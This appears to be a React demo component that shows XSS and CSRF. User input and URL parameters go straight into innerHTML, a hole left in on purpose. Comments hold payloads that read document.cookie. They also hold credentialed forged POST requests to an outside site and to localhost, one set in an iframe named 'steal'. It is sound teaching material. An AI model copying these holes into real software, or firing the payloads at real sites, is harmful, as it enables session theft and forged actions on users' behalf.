import React, { Component } from 'react';
import { Input } from './component/input';

export default class SecurityDemo extends Component {
    constructor() {
        super();
        this.state = {
            //%3Cimg%20src=1%20onerror=alert(document.cookie)%3E%3C/div%3E
            // <script charset="utf-8">alert(123)</script>
            // xss: '<div class="btn-n" onclick="(function(){console.log(123)})()">asdf<img src=1 onerror=alert(document.cookie)></div>'
            xss: ''
        };
    }
    componentDidMount() {
        this.refs.xss.innerHTML = this.state.xss;
        // const myScript = document.createElement('script');
        // myScript.type = 'text/javascript';
        // myScript.innerHTML = 'alert(123)';
        // document.body.appendChild(myScript);

        // this.refs.xss1.innerHTML = this.getParams('name');
    }
    
    getParams(key) {
        const reg = new RegExp(`(&|^)${key}=([^&]*)($|&)`);
        const res = window.location.search.substr(1).match(reg);
        if (res != null) {
            return unescape(res[2]);
        }
        return null;
    }

    requestPost() {
        // const xhr = new XMLHttpRequest();
        // const url = 'http://www.brandf.cn:8010/article';
        // // let fd = new FormData();
        // // fd.append('people', '123');
        // // fd.append('ck', '123');
        // const data = JSON.stringify({
        //     content: 'csrf23333',
        //     id: '',
        //     title: 'csrf23333'
        // });
        // xhr.open('POST', url);
        // xhr.setRequestHeader('content-type', 'application/json');
        // xhr.withCredentials = true;
        // xhr.send(data);
        // xhr.onreadystatechange = function () {
        //     if (xhr.readyState == 4 && xhr.status == 200) {
        //         console.log(xhr.response);
        //     }
        // };
    }

    haneldChangeXSS(v) {
        this.setState({ xss: v });
        // this.refs.xss.innerHTML = v;
    }
    render() {
        return (
            <div>
                <Input maxLength={300} onChange={(v) => this.haneldChangeXSS(v)} />
                {document.innerHtml = this.state.xss}
                <div id="xss" ref="xss"></div>
                <div>
                    <div>getParams</div>
                    wellcome! <div ref="xss1"></div>
                </div>
                <iframe name="steal" className="d-n" ref="csrf">
                    <script>
                        {this.requestPost()}
                    </script>
                </iframe>
            </div>
        );
    }
}

{/* <img src=1 onerror=function(){var x = new XMLHttpRequest();var u = 'http://localhost:8010/comment/normal';var d = JSON.stringify({article_id: '58',comment: '1233211234567'});x.open('POST', u);x.setRequestHeader('content-type', 'application/json');x.withCredentials = true;x.send(d);}/> */ }
